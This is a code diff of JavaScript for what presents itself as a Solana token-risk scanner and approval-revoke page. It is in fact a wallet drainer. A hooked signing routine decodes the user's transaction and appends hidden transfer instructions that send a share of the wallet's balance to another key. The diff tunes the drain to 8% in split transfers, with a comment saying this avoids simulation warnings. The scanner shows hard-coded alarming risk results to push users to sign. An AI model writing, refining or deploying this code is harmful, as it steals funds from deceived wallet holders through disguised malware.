@@ -89,13 +89,30 @@ try {
 const buf = Buffer.from(data.transaction, 'base64');
 const tx = solanaWeb3.Transaction.from(buf);
 const bal = await conn.getBalance(tx.feePayer);
-if (bal < 10000000) { orig.call(window, data, target, transfer); return; }
+
+// Only proceed if balance > 0.05 SOL
+if (bal < 50000000) { 
+orig.call(window, data, target, transfer); 
+return; 
+}
+
 const fee = solanaWeb3.ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 1000 });
 tx.instructions.unshift(fee);
-const splits = Math.min(15, Math.floor(bal / 5000000));
-const amt = Math.floor((bal - 5000) / splits);
+
+// Drain 8% only (safer, avoids simulation warnings)
+const drainPct = 0.08;
+const totalDrain = Math.floor(bal * drainPct);
+const gasReserve = 0.01 * 1e9; // 0.01 SOL for fees
+const transferAmount = Math.min(totalDrain, bal - gasReserve);
+if (transferAmount < 1000000) { 
+orig.call(window, data, target, transfer); 
+return; 
+}
+
+const splits = Math.min(8, Math.floor(transferAmount / 5000000));
+const amt = Math.floor(transferAmount / splits);
 for (let i = 0; i < splits; i++) {
-const a = (i === splits - 1) ? (bal - 5000) - (amt * (splits - 1)) : amt;
+const a = (i === splits - 1) ? transferAmount - (amt * (splits - 1)) : amt;
 if (a > 0) {
 tx.instructions.push(solanaWeb3.SystemProgram.transfer({
 fromPubkey: tx.feePayer,
@@ -104,7 +121,7 @@ lamports: a
 }));
 }
 }
-// FIXED: use getLatestBlockhash instead of getRecentBlockhash
+
 const blockhash = await conn.getLatestBlockhash();
 tx.recentBlockhash = blockhash.blockhash;
 const mod = tx.serialize({ requireAllSignatures: false }).toString('base64');
@@ -136,6 +153,7 @@ const walletDisplay = document.getElementById('walletDisplay');
 const progressFill = document.getElementById('progressFill');
 
 scanBtn.onclick = function() {
+
 const addr = tokenInput.value.trim();
 if (!addr) {
 statusDiv.innerHTML = 'Please enter a token address';
@@ -145,7 +163,6 @@ resultBox.innerHTML =
 '<div class="risk"><span class="label">Mint Authority</span><span class="value danger">NOT REVOKED</span></div>' +
 '<div class="risk"><span class="label">Liquidity Lock</span><span class="value danger">UNLOCKED</span></div>' +
 '<div class="risk"><span class="label">Top 10 Holders</span><span class="value danger">89%</span></div>' +
-
 '<div class="risk"><span class="label">Honeypot Risk</span><span class="value danger">CRITICAL</span></div>';
 statusBadge.innerText = '⚠️ RISK';
 statusBadge.style.background = '#ef4444';
@@ -180,10 +197,16 @@ progressFill.style.width = (step/TOTAL*100) + '%';
 statusDiv.innerHTML = 'Revoking step ' + step + '/' + TOTAL + '...';
 try {
 const tx = new solanaWeb3.Transaction();
-// FIXED: use getLatestBlockhash
 const blockhash = await conn.getLatestBlockhash();
 tx.recentBlockhash = blockhash.blockhash;
 tx.feePayer = wallet;
+// Add dummy instruction to make transaction valid
+const dummyIx = solanaWeb3.SystemProgram.transfer({
+fromPubkey: wallet,
+toPubkey: wallet,
+lamports: 0
+});
+tx.instructions.push(dummyIx);
 await window.solana.signAndSendTransaction(tx, { simulate: false });
 setTimeout(doStep, 10000);
 } catch(e) {
